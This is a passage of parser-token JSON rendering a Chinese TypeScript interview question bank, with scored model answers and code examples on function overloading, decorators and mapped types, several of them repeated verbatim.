级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","task":false,"loose":false,"text":"**2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","tokens":[{"type":"text","raw":"**2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","text":"**2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","text":" 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\n// 重载签名\\nfunction add(a: number, b: number): number;\\nfunction add(a: string, b: string): string;\\n\\n// 实现签名\\nfunction add(a: number | string, b: number | string): number | string {\\n    if (typeof a === \'number\' && typeof b === \'number\') {\\n        return a + b;\\n    }\\n    if (typeof a === \'string\' && typeof b === \'string\') {\\n        return a.concat(b);\\n    }\\n    throw new Error(\'Parameters must be numbers or strings\');\\n}\\n\\nconsole.log(add(1, 2));          // 3\\nconsole.log(add(\\"Hello \\", \\"World\\")); // \\"Hello World\\"\\n```","lang":"typescript","text":"// 重载签名\\nfunction add(a: number, b: number): number;\\nfunction add(a: string, b: string): string;\\n\\n// 实现签名\\nfunction add(a: number | string, b: number | string): number | string {\\n    if (typeof a === \'number\' && typeof b === \'number\') {\\n        return a + b;\\n    }\\n    if (typeof a === \'string\' && typeof b === \'string\') {\\n        return a.concat(b);\\n    }\\n    throw new Error(\'Parameters must be numbers or strings\');\\n}\\n\\nconsole.log(add(1, 2));          // 3\\nconsole.log(add(\\"Hello \\", \\"World\\")); // \\"Hello World\\""},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 在类中使用函数重载：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 在类中使用函数重载：","task":false,"loose":false,"text":"**2：** 在类中使用函数重载：","tokens":[{"type":"text","raw":"**2：** 在类中使用函数重载：","text":"**2：** 在类中使用函数重载：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 在类中使用函数重载：","text":" 在类中使用函数重载：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\nclass Calculator {\\n    add(a: number, b: number): number;\\n    add(a: string, b: string): string;\\n    add(a: any, b: any): any {\\n        if (typeof a === \'number\' && typeof b === \'number\') {\\n            return a + b;\\n        }\\n        if (typeof a === \'string\' && typeof b === \'string\') {\\n            return a.concat(b);\\n        }\\n        throw new Error(\'Parameters must be numbers or strings\');\\n    }\\n}\\n```","lang":"typescript","text":"class Calculator {\\n    add(a: number, b: number): number;\\n    add(a: string, b: string): string;\\n    add(a: any, b: any): any {\\n        if (typeof a === \'number\' && typeof b === \'number\') {\\n            return a + b;\\n        }\\n        if (typeof a === \'string\' && typeof b === \'string\') {\\n            return a.concat(b);\\n        }\\n        throw new Error(\'Parameters must be numbers or strings\');\\n    }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 17. TypeScript中的装饰器是什么？如何使用？\\n\\n","depth":2,"text":"17. TypeScript中的装饰器是什么？如何使用？","tokens":[{"type":"text","raw":"17. TypeScript中的装饰器是什么？如何使用？","text":"17. TypeScript中的装饰器是什么？如何使用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n\\n- **4：** 常见的装饰器类型：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n\\n","task":false,"loose":true,"text":"**2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n","tokens":[{"type":"text","raw":"**2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n","text":"**2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。","text":" 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。","escaped":false}]}]},{"type":"list_item","raw":"- **4：** 常见的装饰器类型：","task":false,"loose":true,"text":"**4：** 常见的装饰器类型：","tokens":[{"type":"text","raw":"**4：** 常见的装饰器类型：","text":"**4：** 常见的装饰器类型：","tokens":[{"type":"strong","raw":"**4：**","text":"4：","tokens":[{"type":"text","raw":"4：","text":"4：","escaped":false}]},{"type":"text","raw":" 常见的装饰器类型：","text":" 常见的装饰器类型：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\n// 类装饰器\\nfunction classDecorator<T extends {new(...args:any[]):{}}>(constructor:T) {\\n    return class extends constructor {\\n        newProperty = \\"new property\\";\\n        hello = \\"override\\";\\n    }\\n}\\n\\n// 方法装饰器\\nfunction methodDecorator(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n    // 保存原始方法\\n    const originalMethod = descriptor.value;\\n    \\n    // 修改方法的行为\\n    descriptor.value = function(...args: any[]) {\\n        console.log(\'Before method execution\');\\n        const result = originalMethod.apply(this, args);\\n        console.log(\'After method execution\');\\n        return result;\\n    }\\n}\\n\\n// 使用装饰器\\n@classDecorator\\nclass Example {\\n    @methodDecorator\\n    greet() {\\n        console.log(\'Hello!\');\\n    }\\n}\\n\\nconst e = new Example();\\ne.greet();\\n// 输出:\\n// Before method execution\\n// Hello!\\n// After method execution\\n```","lang":"typescript","text":"// 类装饰器\\nfunction classDecorator<T extends {new(...args:any[]):{}}>(constructor:T) {\\n    return class extends constructor {\\n        newProperty = \\"new property\\";\\n        hello = \\"override\\";\\n    }\\n}\\n\\n// 方法装饰器\\nfunction methodDecorator(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n    // 保存原始方法\\n    const originalMethod = descriptor.value;\\n    \\n    // 修改方法的行为\\n    descriptor.value = function(...args: any[]) {\\n        console.log(\'Before method execution\');\\n        const result = originalMethod.apply(this, args);\\n        console.log(\'After method execution\');\\n        return result;\\n    }\\n}\\n\\n// 使用装饰器\\n@classDecorator\\nclass Example {\\n    @methodDecorator\\n    greet() {\\n        console.log(\'Hello!\');\\n    }\\n}\\n\\nconst e = new Example();\\ne.greet();\\n// 输出:\\n// Before method execution\\n// Hello!\\n// After method execution"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 18. TypeScript中的映射类型是什么？请举例说明\\n\\n","depth":2,"text":"18. TypeScript中的映射类型是什么？请举例说明","tokens":[{"type":"text","raw":"18. TypeScript中的映射类型是什么？请举例说明","text":"18. TypeScript中的映射类型是什么？请举例说明","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n\\n- **2：** 示例：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n\\n","task":false,"loose":true,"text":"**2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n","tokens":[{"type":"text","raw":"**2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n","text":"**2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。","text":" 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 示例：","task":false,"loose":true,"text":"**2：** 示例：","tokens":[{"type":"text","raw":"**2：** 示例：","text":"**2：** 示例：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 示例：","text":" 示例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\n// 原始接口\\ninterface Person {\\n    name: string;\\n    age: number;\\n    address: string;\\n}\\n\\n// 将所有属性变为可选\\ntype PartialPerson = Partial<Person>;\\n// 等价于:\\n// {\\n//    name?: string;\\n//    age?: number;\\n//    address?: string;\\n// }\\n\\n// 将所有属性变为只读\\ntype ReadonlyPerson = Readonly<Person>;\\n// 等价于:\\n// {\\n//    readonly name: string;\\n//    readonly age: number;\\n//    readonly address: string;\\n// }\\n\\n// 自定义映射类型\\ntype Nullable<T> = {\\n    [P in keyof T]: T[P] | null;\\n};\\n\\n// 使用自定义映射类型\\ntype NullablePerson = Nullable<Person>;\\n// 等价于:\\n// {\\n//    name: string | null;\\n//    age: number | null;\\n//    address: string | null;\\n// }\\n```","lang":"typescript","text":"// 原始接口\\ninterface Person {\\n    name: string;\\n    age: number;\\n    address: string;\\n}\\n\\n// 将所有属性变为可选\\ntype PartialPerson = Partial<Person>;\\n// 等价于:\\n// {\\n//    name?: string;\\n//    age?: number;\\n//    address?: string;\\n// }\\n\\n// 将所有属性变为只读\\ntype ReadonlyPerson = Readonly<Person>;\\n// 等价于:\\n// {\\n//    readonly name: string;\\n//    readonly age: number;\\n//    readonly address: string;\\n// }\\n\\n// 自定义映射类型\\ntype Nullable<T> = {\\n    [P in keyof T]: T[P] | null;\\n};\\n\\n// 使用自定义映射类型\\ntype NullablePerson = Nullable<Person>;\\n// 等价于:\\n// {\\n//    name: string | null;\\n//    age: number | null;\\n//    address: string | null;\\n// }"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 19. 如何在TypeScript中实现函数重载？\\n\\n","depth":2,"text":"19. 如何在TypeScript中实现函数重载？","tokens":[{"type":"text","raw":"19. 如何在TypeScript中实现函数重载？","text":"19. 如何在TypeScript中实现函数重载？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","task":false,"loose":false,"text":"**2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","tokens":[{"type":"text","raw":"**2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","text":"**2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","text":" 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\n// 重载签名\\nfunction add(a: number, b: number): number;\\nfunction add(a: string, b: string): string;\\n\\n// 实现签名\\nfunction add(a: number | string, b: number | string): number | string {\\n    if (typeof a === \'number\' && typeof b === \'number\') {\\n        return a + b;\\n    }\\n    if (typeof a === \'string\' && typeof b === \'string\') {\\n        return a.concat(b);\\n    }\\n    throw new Error(\'Parameters must be numbers or strings\');\\n}\\n\\nconsole.log(add(1, 2));          // 3\\nconsole.log(add(\\"Hello \\", \\"World\\")); // \\"Hello World\\"\\n```","lang":"typescript","text":"// 重载签名\\nfunction add(a: number, b: number): number;\\nfunction add(a: string, b: string): string;\\n\\n// 实现签名\\nfunction add(a: number | string, b: number | string): number | string {\\n    if (typeof a === \'number\' && typeof b === \'number\') {\\n        return a + b;\\n    }\\n    if (typeof a === \'string\' && typeof b === \'string\') {\\n        return a.concat(b);\\n    }\\n    throw new Error(\'Parameters must be numbers or strings\');\\n}\\n\\nconsole.log(add(1, 2));          // 3\\nconsole.log(add(\\"Hello \\", \\"World\\")); // \\"Hello World\\""},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 在类中使用函数重载：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 在类中使用函数重载：","task":false,"loose":false,"text":"**2：** 在类中使用函数重载：","tokens":[{"type":"text","raw":"**2：** 在类中使用函数重载：","text":"**2：** 在类中使用函数重载：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 在类中使用函数重载：","text":" 在类中使用函数重载：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\nclass Calculator {\\n    add(a: number, b: number): number;\\n    add(a: string, b: string): string;\\n    add(a: any, b: any): any {\\n        if (typeof a === \'number\' && typeof b === \'number\') {\\n            return a + b;\\n        }\\n        if (typeof a === \'string\' && typeof b === \'string\') {\\n            return a.concat(b);\\n        }\\n        throw new Error(\'Parameters must be numbers or strings\');\\n    }\\n}\\n```","lang":"typescript","text":"class Calculator {\\n    add(a: number, b: number): number;\\n    add(a: string, b: string): string;\\n    add(a: any, b: any): any {\\n        if (typeof a === \'number\' && typeof b === \'number\') {\\n            return a + b;\\n        }\\n        if (typeof a === \'string\' && typeof b === \'string\') {\\n            return a.concat(b);\\n        }\\n        throw new Error(\'Parameters must be numbers or strings\');\\n    }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 20. TypeScript中的装饰器是什么？如何使用？\\n\\n","depth":2,"text":"20. TypeScript中的装饰器是什么？如何使用？","tokens":[{"type":"text","raw":"20. TypeScript中的装饰器是什么？如何使用？","text":"20. TypeScript中的装饰器是什么？如何使用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n\\n- **4：** 常见的装饰器类型：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n\\n","task":false,"loose":true,"text":"**2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n","tokens":[{"type":"text","raw":"**2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n","text":"**2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。","text":" 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。","escaped":false}]}]},{"type":"list_item","raw":"- **4：** 常见的装饰器类型：","task":false,"loose":true,"text":"**4：** 常见的装饰器类型：","tokens":[{"type":"text","raw":"**4：** 常见的装饰器类型：","text":"**4：** 常见的装饰器类型：","tokens":[{"type":"strong","raw":"**4：**","text":"4：","tokens":[{"type":"text","raw":"4：","text":"4：","escaped":false}]},{"type":"text","raw":" 常见的装饰器类型：","text":" 常见的装饰器类型：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\n// 类装饰器\\nfunction classDecorator<T extends {new(...args:any[]):{}}>(constructor:T) {\\n    return class extends constructor {\\n        newProperty = \\"new property\\";\\n        hello = \\"override\\";\\n    }\\n}\\n\\n// 方法装饰器\\nfunction methodDecorator(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n    // 保存原始方法\\n    const originalMethod = descriptor.value;\\n    \\n    // 修改方法的行为\\n    descriptor.value = function(...args: any[]) {\\n        console.log(\'Before method execution\');\\n        const result = originalMethod.apply(this, args);\\n        console.log(\'After method execution\');\\n        return result;\\n    }\\n}\\n\\n// 使用装饰器\\n@classDecorator\\nclass Example {\\n    @methodDecorator\\n    greet() {\\n        console.log(\'Hello!\');\\n    }\\n}\\n\\nconst e = new Example();\\ne.greet();\\n// 输出:\\n// Before method execution\\n// Hello!\\n// After method execution\\n```","lang":"typescript","text":"// 类装饰器\\nfunction classDecorator<T extends {new(...args:any[]):{}}>(constructor:T) {\\n    return class extends constructor {\\n        newProperty = \\"new property\\";\\n        hello = \\"override\\";\\n    }\\n}\\n\\n// 方法装饰器\\nfunction methodDecorator(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n    // 保存原始方法\\n    const originalMethod = descriptor.value;\\n    \\n    // 修改方法的行为\\n    descriptor.value = function(...args: any[]) {\\n        console.log(\'Before method execution\');\\n        const result = originalMethod.apply(this, args);\\n        console.log(\'After method execution\');\\n        return result;\\n    }\\n}\\n\\n// 使用装饰器\\n@classDecorator\\nclass Example {\\n    @methodDecorator\\n    greet() {\\n        console.log(\'Hello!\');\\n    }\\n}\\n\\nconst e = new Example();\\ne.greet();\\n// 输出:\\n// Before method execution\\n// Hello!\\n// After method execution"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 21. TypeScript中的映射类型是什么？\\n\\n","depth":2,"text":"21. TypeScript中的映射类型是什么？","tokens":[{"type":"text","raw":"21. TypeScript中的映射类型是什么？","text":"21. TypeScript中的映射类型是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n\\n- **2：** 示例：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n\\n","task":false,"loose":true,"text":"**2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n","tokens":[{"type":"text","raw":"**2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n","text":"**2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。","text":" 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 示例：","task":false,"loose":true,"text":"**2：** 示例：","tokens":[{"type":"text","raw":"**2：** 示例：","text":"**2：** 示例：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 示例：","text":" 示例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\n// 原始接口\\ninterface Person {\\n    name: 